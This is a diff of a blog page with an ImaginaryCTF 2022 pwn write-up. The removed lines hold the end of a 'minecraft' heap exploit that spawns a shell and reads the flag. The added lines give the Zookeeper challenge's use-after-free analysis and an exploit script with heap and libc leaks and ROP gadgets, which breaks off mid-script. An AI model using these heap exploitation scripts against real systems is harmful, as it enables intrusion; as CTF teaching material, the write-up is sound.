-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;block: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,content)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>		r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;minecraft.chal.imaginaryctf.org&#34;</span>, <span style="color:#ae81ff">1337</span>)
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">#r = process(&#34;./vuln_patched&#34;)</span>
-</span></span><span style="display:flex;"><span>		place(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x500</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
-</span></span><span style="display:flex;"><span>		place(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x500</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x488</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x511</span>))
-</span></span><span style="display:flex;"><span>		place(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x3940</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
-</span></span><span style="display:flex;"><span>		place(<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0x500</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
-</span></span><span style="display:flex;"><span>		place(<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">0x500</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
-</span></span><span style="display:flex;"><span>		brk(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>)
-</span></span><span style="display:flex;"><span>		
-</span></span><span style="display:flex;"><span>		replace(<span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p16(<span style="color:#ae81ff">0xf940</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		place(<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x500</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
-</span></span><span style="display:flex;"><span>		brk(<span style="color:#ae81ff">6</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;n&#39;</span>)
-</span></span><span style="display:flex;"><span>		brk(<span style="color:#ae81ff">3</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;n&#39;</span>)
-</span></span><span style="display:flex;"><span>		brk(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;n&#39;</span>)
-</span></span><span style="display:flex;"><span>		place(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0x500</span>,p16(<span style="color:#ae81ff">0x5bf0</span>))
-</span></span><span style="display:flex;"><span>		place(<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0x500</span>,p64(<span style="color:#ae81ff">0</span>))
-</span></span><span style="display:flex;"><span>		place(<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">0x500</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span>)
-</span></span><span style="display:flex;"><span>		brk(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;n&#39;</span>)
-</span></span><span style="display:flex;"><span>		place(<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">0x500</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">14</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x3951</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x401114</span>))
-</span></span><span style="display:flex;"><span>		place(<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">0x3940</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span>)
-</span></span><span style="display:flex;"><span>		r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;(l)eak the end poem</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span>)
-</span></span><span style="display:flex;"><span>		r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;idx: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
-</span></span><span style="display:flex;"><span>		sleep(<span style="color:#ae81ff">0.2</span>)
-</span></span><span style="display:flex;"><span>		r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;echo pwn&#34;</span>)
-</span></span><span style="display:flex;"><span>		sleep(<span style="color:#ae81ff">0.2</span>)
-</span></span><span style="display:flex;"><span>		r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat fl*&#34;</span>)
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">while</span> r<span style="color:#f92672">.</span>can_recv(timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>):
-</span></span><span style="display:flex;"><span>			data <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>clean_and_log()
-</span></span><span style="display:flex;"><span>			log<span style="color:#f92672">.</span>info(data)
-</span></span><span style="display:flex;"><span>		r<span style="color:#f92672">.</span>interactive()
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
-</span></span><span style="display:flex;"><span>		print(e)
-</span></span><span style="display:flex;"><span>		print(<span style="color:#e6db74">&#34;FAIL&#34;</span>)
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">pass</span>
-</span></span></code></pre></div><h3 id="lfyg-conclusion-lfyg-1"><lf><yg> Conclusion </lf></yg></h3>
-<p>My solution was just plain heap feng shui. The intended solution however will introduce a much more interesting heap exploitation technique, which might be the better way to exploit heap after GLIBC 2.35 (after __free_hook and __malloc_hook got removed)<br>
-I will write more about this technique in another post. <code>Because there is actually a minecraft revenge challenge ;) </code></p>
-    </div>
-    <footer class="content__footer"></footer>
-
-            </section>
-
-            <section class="page__aside">
-                <div class="aside__about">
-<div class="aside__about">
-    <img class="about__logo" src="https://piers-n.github.io/images/cat.png" alt="Logo">
-<h1 class="about__title">piers</h1>
-<p class="about__description">My personal blog on the journey of learning how2pwn</p>
-</div>
-
-
-<ul class="aside__social-links">
-    
-    <li>
-        <a href="https://github.com/piers-n" rel="me" aria-label="GitHub" title="GitHub"><i class="fab fa-github" aria-hidden="true"></i></a>&nbsp;
-    </li>
-    
-    <li>
-        <a href="sendhelp2703@gmail.com" rel="me" aria-label="Email" title="Email"><i class="fas fa-envelope" aria-hidden="true"></i></a>&nbsp;
-    </li>
-    
-</ul>
-</div>
-                <hr>
-                <div class="aside__content">
-    <p>Writeup on 2 interesting heap challenges: Minecraft and Zookeeper</p>
-    
-        <p>
-            By Piers, 
-            24-07-2022
-        </p>
-    
-
-                </div>
-            </section>
-
-            <footer class="page__footer"><p class="copyright">© 2022</p>
-<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
-</footer>
-
-        </div>
-    </body>
-
-</html>
+<!doctype html><html lang=en><head><title>Imaginary Ctf 2022 Pwn Writeup &ndash; piers's blog</title><meta name=description content="My personal blog on the journey of learning how2pwn"><link rel=apple-touch-icon sizes=76x76 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous><link rel=stylesheet href=https://piers-n.github.io/css/colour/gruvbox-dark.css><link rel=stylesheet href=https://piers-n.github.io/css/colour/dark-mode.css><link rel=stylesheet href=https://piers-n.github.io/css/risotto.css><link rel=stylesheet href=https://piers-n.github.io/css/custom.css></head><body><div class=page><header class=page__header><h1 class=page__logo><a href=https://piers-n.github.io/ class=page__logo-inner>piers's blog</a></h1><nav class="page__nav main-nav"><ul><li class=main-nav__item><a class=nav-main-item href=/about/ title>About</a></li><li class=main-nav__item><a class="nav-main-item active" href=/post/ title=Posts>Posts</a></li></ul></nav></header><section class=page__body><header class=content__header><h1>Imaginary Ctf 2022 Pwn Writeup</h1></header><div class=content__body><p>My team purf3ct cleared the pwn section of this ctf, so for the first time, I feel qualifed enough to make a writeup about 2 heap challenges, which introduce some nice heap exploitation techniques</p><h2 id=lfyg-zookeeper-lfyg><lf><yg>Zookeeper</lf></yg></h2><p><img src=/images/zookeeper/checksec_zookeeper.png alt=checksec><br>The binary is running with GLIBC-2.31.</p><h3 id=lfyg-looking-for-vulnerabilities-lfyg><lf><yg>Looking for vulnerabilities</lf></yg></h3><p>Let&rsquo;s look into IDA decompilation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__cdecl</span> __noreturn <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> idx_; <span style=color:#75715e>// ebx
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  struct_zoo <span style=color:#f92672>*</span>ptr; <span style=color:#75715e>// rbx
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> choice; <span style=color:#75715e>// [rsp+3h] [rbp-1Dh] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> idx; <span style=color:#75715e>// [rsp+4h] [rbp-1Ch] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v7; <span style=color:#75715e>// [rsp+8h] [rbp-18h]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  v7 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__readfsqword</span>(<span style=color:#ae81ff>0x28u</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Are you fit to be the keeper of the zoo?&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> ( <span style=color:#ae81ff>1</span> )
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>while</span> ( <span style=color:#ae81ff>1</span> )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> ( <span style=color:#ae81ff>1</span> )
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;(f)ind a lion&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;(l)ose a lion&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;(v)iew a lion&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%c%*c&#34;</span>, <span style=color:#f92672>&amp;</span>choice);
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> ( choice <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;f&#39;</span> )
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;idx:&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d%*c&#34;</span>, <span style=color:#f92672>&amp;</span>idx);
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> ( idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>16</span> )
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>          idx_ <span style=color:#f92672>=</span> idx;
+</span></span><span style=display:flex><span>          array[idx_] <span style=color:#f92672>=</span> (struct_zoo <span style=color:#f92672>*</span>)<span style=color:#a6e22e>malloc</span>(<span style=color:#ae81ff>0x50uLL</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;len:&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d%*c&#34;</span>, array[idx]);
+</span></span><span style=display:flex><span>          ptr <span style=color:#f92672>=</span> array[idx];
+</span></span><span style=display:flex><span>          ptr<span style=color:#f92672>-&gt;</span>content <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>malloc</span>(<span style=color:#a6e22e>SLODWORD</span>(ptr<span style=color:#f92672>-&gt;</span>len));
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>strcpy</span>(array[idx]<span style=color:#f92672>-&gt;</span>token, <span style=color:#e6db74>&#34;valid management&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;content:&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, array[idx]<span style=color:#f92672>-&gt;</span>content, <span style=color:#a6e22e>SLODWORD</span>(array[idx]<span style=color:#f92672>-&gt;</span>len));
+</span></span><span style=display:flex><span>          array[idx]<span style=color:#f92672>-&gt;</span>content[<span style=color:#a6e22e>SLODWORD</span>(array[idx]<span style=color:#f92672>-&gt;</span>len) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( choice <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;l&#39;</span> )
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;idx:&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d%*c&#34;</span>, <span style=color:#f92672>&amp;</span>idx);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>16</span> )
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>strncmp</span>(array[idx]<span style=color:#f92672>-&gt;</span>token, <span style=color:#e6db74>&#34;valid management&#34;</span>, <span style=color:#ae81ff>0x10uLL</span>) )
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>free</span>(array[idx]);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>free</span>(array[idx]<span style=color:#f92672>-&gt;</span>content);
+</span></span><span style=display:flex><span>        array[idx] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0LL</span>;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> ( choice <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;v&#39;</span> );
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;idx:&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d%*c&#34;</span>, <span style=color:#f92672>&amp;</span>idx);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>16</span> )
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>strncmp</span>(array[idx]<span style=color:#f92672>-&gt;</span>token, <span style=color:#e6db74>&#34;valid management&#34;</span>, <span style=color:#ae81ff>0x10uLL</span>) )
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(array[idx]<span style=color:#f92672>-&gt;</span>content);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>It&rsquo;s a very typical looking heap challenge with these functionalities: malloc, free, and view<br>And there is a struct_zoo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>struct_zoo {
+</span></span><span style=display:flex><span>    _QWORD len;  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> content;  
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> token[<span style=color:#ae81ff>16</span>];  
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Looking through it, we can immediately see this line:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, array[idx]<span style=color:#f92672>-&gt;</span>content, <span style=color:#a6e22e>SLODWORD</span>(array[idx]<span style=color:#f92672>-&gt;</span>len));
+</span></span></code></pre></div><p>Combined with the view function, we can easily leak libc address through unsorted bin, and also heap address through tcache. <code>We have already achieved a info-leak</code><br>There is also another very subtle bug laying in the free function:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>free</span>(array[idx]);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>free</span>(array[idx]<span style=color:#f92672>-&gt;</span>content);  
+</span></span></code></pre></div><p>The chunk is freed before the actual content inside the chunk get freed. What can we achieve with this?<br>Well, when a chunk get freed, there is a fd and bk pointer get placed at the first 16 bytes of the chunk<br><img src=/images/zookeeper/free_chunk1.png alt=free_chunk><br>The bk pointer is actually pointing to a large chunk at the beginning, the tcache_perthread_struct:<br><img src=/images/zookeeper/chunk2.png alt=chunk2><br>Looking at the zoo_struct we can see that the bk pointer perfectly aligns with the content pointer. Thus, we can free the tcache_perthread_struct, and then malloc a chunk with 0x290 size to overwrite that struct. What can we do with this?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span> <span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> tcache_perthread_struct
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> counts[TCACHE_MAX_BINS];<span style=color:#75715e>//0x40
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  tcache_entry <span style=color:#f92672>*</span>entries[TCACHE_MAX_BINS];<span style=color:#75715e>//0x40
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>} tcache_perthread_struct; 
+</span></span></code></pre></div><p>The tcache freelist is structured as a doubly-linked list. And the entries array contains the head of each doubly-linked list with each tcache size.<br><img src=/images/zookeeper/tcache_struct.png alt=tcache_struct><br>Those heap pointer is the head pointer of each list. So if we can overwrite those entries, we can control malloc to return an arbitrary pointer of our control.<br>However, there is the existence of seccomp:<br><img src=/images/zookeeper/seccomp.png alt=seccomp><br>We cannot just overwrite __free_hook with one_gadget, but there is this well documented technique for orw capability. You can read more about it <a href=https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/>here</a></p><h3 id=lfyg-my-messy-exploit-script-lfyg><lf><yg>My messy exploit script</lf></yg></h3><p><code>I shamelessly copied from the blog above</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./vuln_patched&#34;</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./libc-2.31.so&#34;</span>)
+</span></span><span style=display:flex><span>ld <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./ld-2.31.so&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#r = gdb.debug(&#34;./vuln_patched&#34;)</span>
+</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;zookeeper.chal.imaginaryctf.org&#34;</span>,<span style=color:#ae81ff>1337</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>new</span>(idx,sz,content):
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;(v)iew a lion</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>&#39;f&#39;</span>)
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;idx:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,str(idx))
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;len:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,str(sz))
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>&#34;content:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,content)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>delete</span>(idx):
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;(v)iew a lion</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>&#39;l&#39;</span>)
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;idx:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,str(idx))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>view</span>(idx):
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;(v)iew a lion</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>&#39;v&#39;</span>)
+</span></span><span style=display:flex><span>	r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;idx:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,str(idx))
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>new(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0x20</span><span style=color:#f92672>-</span><span style=color:#ae81ff>8</span>,<span style=color:#e6db74>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>view(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>heap_leak <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recvline()[<span style=color:#ae81ff>0</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>,<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
+</span></span><span style=display:flex><span>heap_base <span style=color:#f92672>=</span> heap_leak <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1b61</span>
+</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;HEAP LEAK: &#34;</span> <span style=color:#f92672>+</span> hex(heap_leak))
+</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;HEAP BASE: &#34;</span> <span style=color:#f92672>+</span> hex(heap_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>new(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0x430</span>,<span style=color:#e6db74>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>new(<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0x30</span>,<span style=color:#e6db74>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>view(<span style=color:#ae81ff>2</span>)
+</span></span><span style=display:flex><span>libc_leak <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recvline()[<span style=color:#ae81ff>0</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>,<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
+</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span>libc_leak <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1ebc61</span>
+</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;LIBC LEAK: &#34;</span> <span style=color:#f92672>+</span> hex(libc_leak))
+</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;LIBC BASE ADDRESS: &#34;</span> <span style=color:#f92672>+</span> hex(libc<span style=color:#f92672>.</span>address))
+</span></span><span style=display:flex><span><span style=color:#75715e>#context.log_level = 1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>pop_rdi <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x26b72</span>
+</span></span><span style=display:flex><span>pop_rsi <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x27529</span>
+</span></span><span style=display:flex><span>pop_rdx_r12 <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x11c371</span>
